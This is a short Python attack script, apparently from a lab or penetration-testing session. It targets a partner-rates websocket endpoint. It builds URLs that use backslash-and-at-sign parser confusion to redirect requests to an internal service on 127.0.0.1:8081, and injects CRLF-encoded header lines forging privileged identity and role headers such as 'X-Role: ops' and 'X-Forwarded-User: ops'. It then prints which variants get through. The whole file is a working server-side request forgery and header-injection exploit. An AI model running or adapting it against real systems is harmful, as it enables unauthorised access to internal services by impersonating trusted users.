import time, select, urllib.parse
from ws import connect, recv_frame
hdr_block="X-Partner: ops|X-Partner-Id: ops|X-Role: ops|X-Identity: ops|X-User: ops|X-VaultLink-Partner: ops|X-Partner-Role: ops|X-Forwarded-User: ops|X-Auth-User: ops|Identity: ops|Role: ops|User: ops|X-Ops: 1"
def build(names, enc):
    lines=""
    for n in names:
        k,v=n.split(": ")
        sep=enc
        lines+=sep+k+":"+sep+v
    return lines
encs=["%0d%0a","%0a","%250d%250a","%0D%0A"]
cases=[]
names=hdr_block.split("|")
for e in encs:
    block=build(names,e)
    cases.append((f"path {e}", f"http://rates.partner-forex.example.com\\@127.0.0.1:8081/ws{e if e!='%250d%250a' else '%250d%250a'}"+block))
    cases.append((f"userinfo {e}", f"http://rates.partner-forex.example.com\\ops:x{block}@127.0.0.1:8081/ws"))
for name,v in cases:
    try:
        s,resp=connect(inner=v); s.setblocking(False)
        out=[]; end=time.time()+1.0
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.1)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: out.append(b"EOF"); break
        s.close()
        print(f"{name:18s}", resp.split("\r\n")[0], out)
    except Exception as e:
        print(f"{name:18s} EXC", str(e)[:60])
